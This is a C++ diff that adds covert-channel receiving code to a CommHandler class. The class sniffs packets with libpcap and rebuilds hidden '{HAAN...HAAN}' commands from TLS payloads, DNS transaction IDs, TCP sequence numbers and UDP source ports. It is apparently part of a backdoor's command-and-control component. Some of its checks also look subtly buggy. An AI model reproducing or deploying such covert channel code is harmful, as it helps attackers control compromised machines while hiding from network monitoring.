@@ -82,18 +82,18 @@ bool CommHandler::getInterface() {
         return false;
     }
 
-    Logger::debug(to_string(getpid()) + " NetworkMonitor:getInterfaces - Looping Through All Interfaces") ;
+    Logger::debug(to_string(getpid()) + " CommHandler:getInterfaces - Looping Through All Interfaces") ;
 
     allInterfaces = interfaces;
     interface = interfaces;
     while(interface != NULL){
         const char * name = interface->name;
 
-        Logger::debug(to_string(getpid()) + " NetworkMonitor:getInterfaces - Testing Interface With Name: " + string(name));
+        Logger::debug(to_string(getpid()) + " CommHandler:getInterfaces - Testing Interface With Name: " + string(name));
 
         if(strcmp(name, string("any").c_str()) == 0){
             //this is the any interface
-            Logger::debug(to_string(getpid()) + " NetworkMonitor:getInterfaces - FOUND THE ANY INTERFACE");
+            Logger::debug(to_string(getpid()) + " CommHandler:getInterfaces - FOUND THE ANY INTERFACE");
 
             listeningInterface = interface;
             return true;
@@ -219,8 +219,127 @@ void CommHandler::packetCallback(u_char *ptrnull, const struct pcap_pkthdr *pkt_
 
         //we are connected and ready to rooooolllllll
 
+        char * applicationLayer = PacketIdentifier::findApplicationLayer(&meta);
+        if(applicationLayer == nullptr){
+            Logger::debug("CommHandler:listenForTraffic - Could Not Find Application Layer For Packet. Can't Do Anything With It");
+            return;
+        }
 
+        //if it is a TLS packet, the auth information is in the payload. We need to decrypt first before authenticating
+        if(meta.applicationType == ApplicationType::TLS){
+            Logger::debug("CommHandler:listenForTraffic - Packet Is TLS. Must Decrypt First Before Authenticating");
+
+            //we need to decrypt first before authenticating
+            if(CommHandler::instance->crypto->decryptPacket(&meta, applicationLayer) == false){
+                Logger::debug("CommHandler:listenForTraffic - There Was An Error Decrypting The Packet. Can't Use Packet If It Contains Information");
+                cout << "Failed To Decrypt - Skipping" << endl;
+                return;
+            }else{
+
+                Logger::debug("CommHandler:listenForTraffic - TLS Decryption Successfull. Now Authenticating");
+                //now authenticate
+                if(Authenticator::isAuthenticPacket(&meta)){
+                    Logger::debug("CommHandler:listenForTraffic - TLS Packet IS Ours. Parsing Contents");
+
+                    CommHandler::instance->parseApplicationContent(&meta, applicationLayer);
+                }else{
+                    Logger::debug("CommHandler:listenForTraffic - TLS Packet Decrypted But Did Not Authenticate");
+                    //if it is not our packet give it to the TrafficAnalyzer
+                    //because it decrypted but did not authenticate, its a wierd packet. we nothing to do with it. might be our own anyway
+                    //CommHandler::instance->trafficAnalyzer->addPacketMetaToHistory(meta);
+                }
+            }
+
+            //else this is not a TLS packet and we can Authenticate it first before decrypting
+        }else{
+
+            Logger::debug("CommHandler:listenForTraffic - Packet Is Not TLS. Authenticating Before Decryption");
+            //authenticate first
+            if(Authenticator::isAuthenticPacket(&meta)){
+
+                //then decrypt
+                Logger::debug("CommHandler:listenForTraffic - Non-TLS Packet Is Ours. Now Decrypting");
+
+                if(CommHandler::instance->crypto->decryptPacket(&meta, applicationLayer) == false){
+                    Logger::debug("CommHandler:listenForTraffic - There Was An Error Decrypting The Non-TLS Packet. Can't Use Packet If It Contains Information");
+
+                    //could be a situation here where decryptPacket thought it was TLS but if Authenticator approves it and says its not TLS, something
+                    //will have gone wrong
+
+                    //add the packet to history assuming its not ours
+                    //CommHandler::instance->trafficAnalyzer->addPacketMetaToHistory(meta);
+                    //because its not TLS, we can authenticate it, it passed authentication, but failed decryption. this could
+                    //be our own sendout getting caught back in. shouldn't keep it
+                    return;
+                }
+
+                //decryption was successful
+                Logger::debug("CommHandler:listenForTraffic - Non-TLS Decryption Successful. Now Parsing Contents");
+
+                if(meta.applicationType != ApplicationType::UNKNOWN){
+                    Logger::debug("CommHandler:listenForTraffic - Packet Contains Our Data In The Application Layer");
+                    CommHandler::instance->parseApplicationContent(&meta, applicationLayer);
+                }else{
+                    Logger::debug("CommHandler:listenForTraffic - Packet Contains Our Data In The Transport Layer");
+                    CommHandler::instance->parseTransportContent(&meta);
+                }
+
+
+            }else{
+                Logger::debug("CommHandler:listenForTraffic - Non-TLS Packet Is Not Ours");
+            }
+
+        }
+
+        //if we have received the full message then kill listening so that our hanging method will return
+        if(CommHandler::instance->isFullCommand()){
+
+            //add the now full command to the MessageQueue
+            Message message = CommHandler::instance->generateMessageFromCommand(*CommHandler::instance->command);
+            if(message.messageType == MessageType::INTERCLIENT && message.interMessageCode == InterClientMessageType::EMPTY){
+                //don't do anything with it, its not a valid message
+            }else{
+                CommHandler::instance->messageQueue->addMessageResponse(message);
+            }
+
+
+            //clear the command
+            delete(CommHandler::instance->command);
+            CommHandler::instance->command = new string("");
+        }
     }
+}
+
+Message CommHandler::generateMessageFromCommand(string haanradPacket) {
+
+    Message message;
+    message.interMessageCode = InterClientMessageType::NONE;
+    message.rawCommandMessage = haanradPacket;
+
+    unsigned char cmdType = haanradPacket.at(5);
+    message.messageType = (MessageType::MessageTypeEnum)cmdType;
+
+    if(message.messageType == MessageType::CMD || message.messageType == MessageType::FILE || message.messageType == MessageType::FILESYNC){
+        Logger::debug("CommHandler:generateMessageFromCommand - Command Is Not Possible. These Are Likely From Ourself");
+        message.interMessageCode = InterClientMessageType::EMPTY;
+        message.messageType = MessageType::INTERCLIENT;
+        message.data = "Invalid Packet Received";
+    }
+
+    unsigned long ending = haanradPacket.find("HAAN}");
+    if(ending == string::npos){
+        Logger::debug("CommHandler:generateMessageFromCommand - Could Not Find End Of Command. Can't Format Properly");
+        message.interMessageCode = InterClientMessageType::ERROR;
+        message.messageType = MessageType::INTERCLIENT;
+        message.data = "Parsing Error For A Received Message";
+        return message;
+    }
+
+    //we found the ending otherwise
+    string parameters = haanradPacket.substr(6, (ending - 6));
+    message.data = parameters;
+
+    return message;
 
 }
 
@@ -271,6 +390,9 @@ string CommHandler::parseOutDNSQuery(PacketMeta meta){
 
 void CommHandler::listenForMessages() {
 
+
+    this->command = new string("");
+
     char errbuf[PCAP_ERRBUF_SIZE];
     bpf_u_int32 subnetMask;
     bpf_u_int32 ip;
@@ -288,7 +410,7 @@ void CommHandler::listenForMessages() {
     //setup the libpcap filter
     struct bpf_program fp;
     //compile the filter
-    if(pcap_compile(this->currentFD, &fp, "udp or tcp", 0, ip) == -1){
+    if(pcap_compile(this->currentFD, &fp, "(udp or tcp) and ip dst 127.0.0.1", 0, ip) == -1){
         Logger::debug(to_string(getpid()) + " CommHandler:listenForTraffic - There Was An Error Compiling The Filter");
         return;
     }
@@ -433,6 +555,142 @@ void CommHandler::processMessagesToSend() {
             }
         }
     }
+}
+
+void CommHandler::parseApplicationContent(PacketMeta * meta, char * applicationLayer) {
+
+    switch(meta->applicationType){
+        case ApplicationType::TLS:{
+
+            struct TLS_HEADER * tls = (struct TLS_HEADER *)applicationLayer;
+            char * payload = applicationLayer + sizeof(struct TLS_HEADER);
+            string strPayload(payload);
+
+            Logger::debug("CommHandler:parseApplicationContent - Packet is TLS. Data Is In The Body");
+            Logger::debug("CommHandler:parseApplicationContent - Body Content: >" + strPayload + "<");
+
+            CommHandler::instance->command->append(strPayload);
+
+            break;
+        }
+        case ApplicationType::DNS:{
+
+            struct DNS_HEADER * dns = (struct DNS_HEADER *)applicationLayer;
+
+            char content[3];
+            content[2] = '\0';
+            memcpy(content, &dns->id, 2);
+            string strContent(content);
+
+            Logger::debug("CommHandler:parseApplicationContent - Packet is DNS. Data Is In The Transaction ID");
+            Logger::debug("CommHandler:parseApplicationContent - ID Content: >" + strContent + "<");
+
+            (*this->command) += content[0];
+            (*this->command) += content[1];
+
+            break;
+        }
+        default:{
+            Logger::debug("CommHandler:parseApplicationContent - FATAL ERROR. APPLICATION TYPE UNKNOW");
+        }
+    }
+
+}
+
+void CommHandler::parseTransportContent(PacketMeta * meta) {
+
+
+    switch(meta->transportType){
+        case TransportType::TCP:{
+
+            char * transportLayer = PacketIdentifier::findTransportLayer(meta);
+            struct tcphdr * tcp = (struct tcphdr *)transportLayer;
+
+            char content[4];
+            memcpy(content, &tcp->seq, 4);
+
+            int sequence = tcp->seq;
+
+            Logger::debug("CommHandler:parseTransportContent - Packet is TCP. Data Is In The Sequence Number");
+            Logger::debug("CommHandler:parseTransportContent - Sequence Content: >" + to_string(content[2]) + "< >" + to_string(content[3]) + "<");
+            cout << "CommHandler:parseTransportContent - Sequence Content: >" << content[2] << "< >" << content[3] << "<" << endl;
+
+
+            (*this->command) += content[2];
+            (*this->command) += content[3];
+
+            break;
+        }
+        case TransportType::UDP:{
+
+            char * transportLayer = PacketIdentifier::findTransportLayer(meta);
+            struct udphdr * udp = (struct udphdr *)transportLayer;
+
+            char content[2];
+            memcpy(content, &udp->uh_sport, 2);
+
+            Logger::debug("CommHandler:parseTransportContent - Packet is UDP. Data Is In The Source Port");
+            string data;
+            data += content[1];
+            Logger::debug("CommHandler:parseTransportContent - Source Content: >" + data + "<");
+
+            (*this->command) += content[1];
+
+            break;
+        }
+        default:{
+            Logger::debug("CommHandler:parseTransportContent - FATAL ERROR. TRANSPORT TYPE UNKNOWN");
+        }
+    }
+}
+
+bool CommHandler::isFullCommand() {
+
+    Logger::debug("CommHandler:isFullCommand - Validating Data Retreived So Far");
+    Logger::debug("CommHandler:isFullCommand - Command Currently Is: >" + *this->command + "<");
+
+    cout << "Command Currently Is: >" << *this->command << "<" << endl;
+
+    //{HAAN 00000000 data HAAN}\0
+
+    //if the first 5 letters don't checkout we should assume data is corrupted and start over
+    if(this->command->length() >= 5){
+        if(this->command->at(0) != '{' && this->command->at(1) != 'H' && this->command->at(2) != 'A'
+           && this->command->at(3) != 'A' && this->command->at(4) != 'N'){
+            Logger::debug("CommHandler:isFullCommand - First 5 Letters In Command Don't Match. Assuming Corrupt");
+            Logger::debug("CommHandler:isFullCommand - Command Currently Is: >" + *this->command + "<");
+
+            this->command->clear(); //clear the string contents. resetting it
+
+            cout << "Command Not Formnat Invalid" << endl;
+            return false;
+        }
+    }
+
+    //the length should at minimum be 11 characters
+    if(this->command->length() < 11){
+        cout << "Command Not Long Enough" << endl;
+        return false;
+    }
+
+    //check it starts with {HAAN
+    unsigned long length = this->command->length();
+    string start = this->command->substr(0,5);
+    string end = this->command->substr(length - 5 - 1, 5);
+
+    Logger::debug("CommHandler:isFullCommand - Parsed TAGS. Start: >" + start + "< End: >" + end + "<");
+    if(start.compare("{HAAN")!=0){
+        cout << "Doesn't Start with {HAAN. Starts with: >" << start << "<" << endl;
+        return false;
+    }
+
+    //check it ends with HAAN}
+    if(end.compare("HAAN}")!= 0){
+        cout << "Doesn't End With HAAN}. Ends with: >" << end << "<" << endl;
+        return false;
+    }
+
+    return true;
 }
 
 /**
